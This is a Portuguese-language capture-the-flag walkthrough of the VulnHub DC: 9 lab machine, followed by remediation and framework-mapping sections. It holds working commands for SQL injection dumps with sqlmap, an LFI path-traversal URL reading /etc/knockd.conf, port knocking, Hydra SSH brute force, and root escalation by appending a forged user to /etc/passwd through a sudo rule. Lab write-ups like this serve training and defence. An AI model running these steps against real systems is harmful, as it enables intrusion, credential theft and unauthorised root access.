# DC: 9 — Bate, Bate, Quem É? É o Root.

DC: 9 é uma máquina de dificuldade média que encadeia cinco técnicas distintas em um caminho surpreendentemente elegante para o root, mano. Um SQLi no formulário de busca dumpa credenciais e um script de file-append. LFI via painel admin lê `/etc/knockd.conf`, revelando a sequência de port-knocking que desbloqueia o SSH. O Hydra quebra as credenciais dumpadas, as senhas em sticky notes escondidas do janitor levam ao fredf, e a regra sudo do fredf em um script Python de file-append permite escrever um novo usuário root diretamente no `/etc/passwd`. Em camadas, metódico e muito recompensador.

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | DC: 9 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/dc-9,412/ |
| **Técnicas** | SQL injection (formulário de busca), dump de banco via sqlmap, quebra de hash MD5, LFI (parâmetro file), port knocking (7469-8475-9842), brute-force SSH com Hydra, movimento lateral via arquivo de senha oculto, injeção em /etc/passwd via sudo file-append |
| **CVEs** | CWE-89 (SQL Injection), CWE-22 (Path Traversal / LFI), CWE-269 (Gerenciamento Impróprio de Privilégios via sudo file-append) |
| **Grupos APT** | APT41 (encadeia SQLi e LFI para acesso lateral em ambientes web corporativos); OceanLotus/APT32 (usa reutilização de credenciais e movimento lateral via contas de baixo privilégio comprometidas em ambientes Linux) |

---

## Resumo do Ataque

```
[nmap: porta 80 aberta, porta 22 filtrada]
    → [app web: formulário de busca → SQLi confirmado]
    → [sqlmap: Staff DB → admin:transorbital1 (MD5)]
    → [sqlmap: users DB → tabela UserDetails → credenciais em texto puro]
    → [login admin → welcome.php?file= LFI confirmado]
    → [LFI: /etc/knockd.conf → sequência de knock 7469 8475 9842]
    → [knock 192.168.1.8 7469 8475 9842 → porta SSH 22 abre]
    → [hydra -L users.txt -P pass.txt ssh → janitor:Ilovepeepee]
    → [SSH como janitor → .secrets-for-putin/ → senhas extras]
    → [hydra novamente → fredf:B4-Tru3-001]
    → [su fredf → sudo -l: /opt/devstuff/test NOPASSWD]
    → [openssl passwd -1 → hash para novo usuário root]
    → [echo 'pavan:<hash>:0:0::/root:/bin/bash' > /tmp/raj]
    → [sudo /opt/devstuff/test /tmp/raj /etc/passwd]
    → [su pavan → uid=0(root)]
    → [cat /root/flag.txt → FLAG]
```

---

## Metodologia

1. Descoberta de rede e varredura de portas (porta 22 filtrada, porta 80 aberta)
2. Análise da aplicação web: descoberta de SQL injection no formulário de busca
3. sqlmap: dump dos bancos Staff e users
4. Login admin e descoberta do LFI no welcome.php
5. LFI para ler /etc/knockd.conf: extrair sequência de port-knocking
6. Port knocking para abrir SSH
7. Brute-force SSH com Hydra usando credenciais dumpadas
8. Movimento lateral: janitor → arquivo de senha oculto → fredf
9. Escalação de privilégios: sudo file-append de fredf → injeção em /etc/passwd → root
10. Captura da flag root

---

## Passo 1 — Descoberta de Host e Varredura de Portas

```bash
netdiscover -r 192.168.1.0/24
```

Alvo identificado em `192.168.1.8`.

```bash
nmap -A 192.168.1.8
```

Output esperado:

```
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.x
```

Porta 22 está filtrada, não fechada. Isso é a marca registrada do port knocking: a porta existe mas está escondida atrás de uma regra de firewall que a abre somente após receber pacotes em portas específicas em sequência. A porta 80 é nosso ponto de partida.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — SQL Injection no Formulário de Busca

A aplicação web tem um formulário de busca. No Burp Suite, capture a requisição POST de busca e salve em `raj.txt`. Teste SQL injection adicionando aspas simples ao parâmetro de busca.

Execute sqlmap contra a requisição salva:

```bash
sqlmap -r raj.txt --dbs --batch
```

Dois bancos identificados: `Staff` e `users`.

Faça dump de ambos:

```bash
sqlmap -r raj.txt -D Staff --dump-all --batch
sqlmap -r raj.txt -D users --dump-all --batch
```

**Banco Staff:** Tabela Admin com hash MD5. Quebre-o:

```bash
echo "hash_md5" > admin.hash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt admin.hash
# Resultado: transorbital1
```

Credencial admin: `admin:transorbital1`

**Banco users:** Tabela UserDetails com vários nomes de usuário e senhas em texto puro. Extraia para arquivos `user.txt` e `pass.txt`.

**Nota real:** SQL injection em formulários de busca web é uma das vulnerabilidades web mais consistentemente exploradas em engajamentos reais. O APT41 foi documentado usando ferramentas automatizadas de SQLi contra portais de busca de pacientes em organizações de saúde em 2020 para exfiltrar dados pessoais antes de pivotar para sistemas internos.

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Pública; T1005 — Dados do Sistema Local; T1110.002 — Força Bruta: Quebra de Senha

---

## Passo 3 — Login Admin e Descoberta do LFI

Faça login na aplicação web como `admin:transorbital1`. Após o login, o rodapé pode mostrar erro "arquivo não existe" — esse é o sinal do LFI. Teste path traversal no parâmetro `file`:

```
http://192.168.1.8/welcome.php?file=../../../../../../../etc/passwd
```

LFI confirmado. O parâmetro `file` aceita path traversal arbitrário e inclui o arquivo referenciado.

Agora extraia o arquivo crítico: a configuração do daemon de port-knocking:

```
http://192.168.1.8/welcome.php?file=../../../../../../../etc/knockd.conf
```

Output esperado (seção principal):

```
[openSSH]
    sequence    = 7469,8475,9842
    seq_timeout = 5
    command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
    tcpflags    = syn
```

**Sequência de port-knocking: 7469, 8475, 9842**

**Nota real:** Port knocking é um controle de segurança legítimo usado para esconder serviços de scanners. Mas se o knockd.conf for legível via qualquer vulnerabilidade de divulgação de arquivo (LFI, path traversal, SSRF), o controle inteiro é anulado. Esse é um achado comum: a configuração que protege a porta está armazenada em um local acessível através da vulnerabilidade que contorna a autenticação.

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Pública; T1083 — Descoberta de Arquivos e Diretórios; T1552.001 — Credenciais em Arquivos

---

## Passo 4 — Port Knocking e Brute-Force SSH

Envie a sequência de knock para abrir o SSH:

```bash
# Instale knockd se necessário: apt install knockd
knock 192.168.1.8 7469 8475 9842

# Verifique se SSH está aberto agora
nmap -p22 192.168.1.8
# Esperado: 22/tcp open ssh
```

Crie wordlists de usuários e senhas a partir do dump do banco users. Execute Hydra:

```bash
hydra -L user.txt -P pass.txt 192.168.1.8 ssh -t 4
```

Credencial válida encontrada: `janitor:Ilovepeepee`

**MITRE ATT&CK:** T1110.001 — Força Bruta: Adivinhação de Senha; T1021.004 — Serviços Remotos: SSH

---

## Passo 5 — SSH como janitor: Arquivo de Senhas Oculto

```bash
ssh janitor@192.168.1.8
# Senha: Ilovepeepee

ls -la
ls -la .secrets-for-putin/
cat .secrets-for-putin/secrets
```

O diretório oculto contém um arquivo com senhas adicionais (estilo sticky notes). Adicione essas senhas ao `pass.txt` na máquina atacante.

Execute Hydra novamente com a lista de senhas expandida contra todos os usuários conhecidos:

```bash
hydra -L user.txt -P pass.txt 192.168.1.8 ssh -t 4
```

Credencial válida adicional encontrada: `fredf:B4-Tru3-001`

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1552.001 — Credenciais em Arquivos; T1021.004 — Serviços Remotos: SSH

---

## Passo 6 — Movimento Lateral para fredf e Enumeração Sudo

A partir do shell do janitor ou SSH direto:

```bash
su fredf
# Senha: B4-Tru3-001

sudo -l
```

```
User fredf may run the following commands on dc-9:
    (root) NOPASSWD: /opt/devstuff/test
```

Inspecione o script:

```bash
cat /opt/devstuff/test.py
```

```python
#!/usr/bin/python3

import sys

if len(sys.argv) != 3:
    print ("Usage: python test.py read_file write_file")
    sys.exit(1)

else:
    f = open(sys.argv[1], "r")
    output = f.readlines()
    f.close()

    f = open(sys.argv[2], "a")
    f.writelines(output)
    f.close()
```

O script adiciona o conteúdo de `sys.argv[1]` ao `sys.argv[2]` como root. Isso é equivalente a dar ao fredf acesso de escrita root a qualquer arquivo no sistema. O caminho para root: criar uma entrada maliciosa em /etc/passwd e adicioná-la.

**MITRE ATT&CK:** T1548.003 — Abuso de Mecanismo de Elevação: Sudo

---

## Passo 7 — Escalação via Injeção em /etc/passwd

Gere um hash de senha para o novo usuário root:

```bash
openssl passwd -1 -salt pavan 123456
# Output: $1$pavan$qv9M3fBmtDPrOTBZflNl81
```

Crie a entrada maliciosa do /etc/passwd em um arquivo temporário:

```bash
echo 'pavan:$1$pavan$qv9M3fBmtDPrOTBZflNl81:0:0::/root:/bin/bash' > /tmp/raj
```

Adicione ao /etc/passwd usando o script permitido pelo sudo:

```bash
sudo /opt/devstuff/test /tmp/raj /etc/passwd
```

Mude para o novo usuário root:

```bash
su pavan
# Senha: 123456
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/flag.txt
```

(☞ﾟヮﾟ)☞ Root via injeção em /etc/passwd. GG, rapaziada.

**MITRE ATT&CK:** T1548.003 — Abuso de Mecanismo de Elevação: Sudo; T1136.001 — Criar Conta: Conta Local

---

## Passo 8 — Flag Root

```bash
cat /root/flag.txt
```

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado Em | Quebrado/Usado |
|---|---|---|---|
| Hash MD5 admin | (hash do Staff.Admin) | dump sqlmap do banco Staff | hashcat/john → admin:transorbital1 |
| Credenciais usuário em texto puro | (múltiplos: janitor:Ilovepeepee, etc.) | dump sqlmap do users.UserDetails | Brute-force SSH com Hydra |
| Senhas adicionais | (senhas dos sticky notes) | `/home/janitor/.secrets-for-putin/` | Hydra rodada 2 → fredf:B4-Tru3-001 |
| Sequência de port-knocking | 7469, 8475, 9842 | LFI lendo `/etc/knockd.conf` | Port knocking para abrir SSH |
| Flag root | (conteúdo de `/root/flag.txt`) | `/root/flag.txt` | Lida como root via injeção em /etc/passwd |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | SQLi no formulário de busca cascateou para comprometimento total de BD e LFI | APT41 usa SQLi em portais de busca web em escala corporativa; a cadeia (SQLi → credenciais → LFI → config de port-knock) é realista e documentada | Parametrizar TODAS as queries de banco; usar WAF com proteção SQLi; separar bancos de admin e usuários |
| 2 | LFI expôs knockd.conf, anulando o port knocking | Configuração de controle de segurança armazenada em local acessível via LFI anula o controle integralmente | Nunca armazenar configurações sensíveis em caminhos acessíveis via web; aplicar defesa em profundidade |
| 3 | Senhas em texto puro no banco users | Armazenar senhas em texto puro é CWE-312; bancos reais armazenam apenas hashes salgados | Usar bcrypt/scrypt/argon2 para hash de senhas; nunca armazenar credenciais em texto puro |
| 4 | Diretório .secrets-for-putin oculto com senhas extras | Diretórios de ponto "ocultos" não são seguros; ls -la os revela instantaneamente | Credenciais devem estar em sistema de gestão de segredos, nunca em diretórios do sistema de arquivos |
| 5 | Script sudo de file-append = acesso de escrita root a qualquer arquivo | Uma regra sudo permitindo escrita arbitrária de arquivos é equivalente a acesso root total; qualquer arquivo pode ser sobrescrito | Nunca permitir regras sudo que permitem escrita arbitrária de arquivos; auditar todas as entradas NOPASSWD no sudoers |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | TTP ID |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Pública | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Quebra de Senha | T1110.002 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Execução | Execução | Interpretador de Comandos: Shell Unix | T1059.004 |
| Descoberta | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Movimento Lateral | Movimento Lateral | Uso de Material de Autenticação Alternativo | T1550 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Mecanismo de Elevação: Sudo | T1548.003 |
| Escalação de Privilégios | Escalação de Privilégios | Criar Conta: Conta Local | T1136.001 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Parametrizar todas as queries de banco** — o formulário de busca deve usar prepared statements; implantar regras WAF para padrões SQLi
2. **Armazenar knockd.conf fora da web root** — mover configurações sensíveis para `/etc/` com permissões `root:root 600`; nunca colocá-lo onde LFI possa alcançar
3. **Hash de senhas com bcrypt/argon2** no banco users — nunca armazenar em texto puro; rotacionar todas as credenciais expostas imediatamente
4. **Remover a regra sudo para `/opt/devstuff/test`** — nenhuma regra sudo deve permitir escritas arbitrárias de arquivos; fredf não tem necessidade legítima dessa capacidade
5. **Implementar SSH apenas com chave** — desabilitar autenticação por senha: `PasswordAuthentication no` no sshd_config; combinar com fail2ban e port knocking para defesa em profundidade
6. **Auditar todos os diretórios home** para arquivos ocultos com credenciais: `find /home -name ".*" -type f 2>/dev/null`

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Auditar validação de input da app web; inventariar todas as regras sudo; auditar conteúdo dos diretórios home |
| Proteger | Controle de Acesso | Remover regra sudo de file-append; aplicar SSH apenas com chave; aplicar menor privilégio |
| Proteger | Segurança de Dados | Hash de todas as senhas com bcrypt/argon2; remover credenciais em texto puro do banco; mover knockd.conf |
| Detectar | Anomalias e Eventos | Alertar sobre modificação de /etc/passwd; monitorar indicadores SQLi em logs web; detectar logins SSH inesperados |
| Responder | Planejamento de Resposta | Rotacionar todas as credenciais expostas; remover entradas injetadas em /etc/passwd; corrigir SQLi; corrigir regras sudo |
| Recuperar | Planejamento de Recuperação | Restaurar /etc/passwd limpo e configuração da app web; re-auditar todas as contas e regras sudo |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| SI-10 | Validação de Input | Queries parametrizadas para formulário de busca; proteção WAF SQLi |
| IA-5 | Gerenciamento de Autenticadores | bcrypt/argon2 para hash de senhas; rotacionar todas as credenciais expostas |
| AC-6 | Menor Privilégio | Remover file-append sudo; restringir SSH apenas para chave |
| SC-28 | Proteção de Informações em Repouso | Sem senhas em texto puro no banco; criptografar arquivos de configuração sensíveis |
| AU-12 | Geração de Registros de Auditoria | Alertar sobre modificações em /etc/passwd e /etc/shadow; registrar todas as execuções sudo |

### CISA KEV

A combinação de SQL injection (CWE-89) e LFI (CWE-22) em aplicações web é abordada em múltiplos avisos CISA (AA22-074A, AA21-008A). A CISA chama atenção especificamente para o risco de divulgação de credenciais via injeção de banco de dados como ataque de primeiro estágio que permite comprometimento total do sistema.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Vulnerabilidades e Ameaças (THREAT) | Identificar e Remediar Vulnerabilidades de App Web (SQLi, LFI) | MIL3 |
| Gestão de Identidade e Acesso (IAM) | Gerenciar Credenciais (sem senhas em texto puro; remover regras sudo inseguras) | MIL3 |
| Gestão de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Linha de Base de Configuração (regras sudo; configuração SSH; locais de arquivos sensíveis) | MIL2 |

### MITRE D3FEND

- **D3-SQLP** (Proteção de Query SQL): queries parametrizadas para todas as interações com banco de dados
- **D3-FPR** (Restrição de Caminho de Arquivo): restringir parâmetro file em páginas vulneráveis a LFI; whitelist de caminhos permitidos
- **D3-OAM** (Gerenciamento Administrativo do SO): restringir regras sudo; monitorar modificações em /etc/passwd

---

## Considerações Finais

DC: 9 é uma daquelas máquinas onde cada técnica se apoia na anterior, e se você pular um passo bate numa parede. O truque do port-knocking em particular é top demais: parece um beco sem saída até o LFI entregar o arquivo de configuração, e de repente o que parecia uma barreira intransponível se torna apenas mais uma porta com as chaves ali do lado.

O final com injeção em /etc/passwd é um clássico que todo profissional de segurança Linux deve entender. Não é um CVE: é uma característica de design da autenticação Unix que se torna uma vulnerabilidade quando combinada com uma regra sudo insegura. A lição: audite seu arquivo sudoers com a mesma intensidade que você audita suas regras de firewall.

A cadeia de cinco técnicas do DC: 9 representa exatamente como o movimento lateral no mundo real parece quando atacantes têm tempo e paciência.

Thanks guys!! (❍ᴥ❍ʋ)
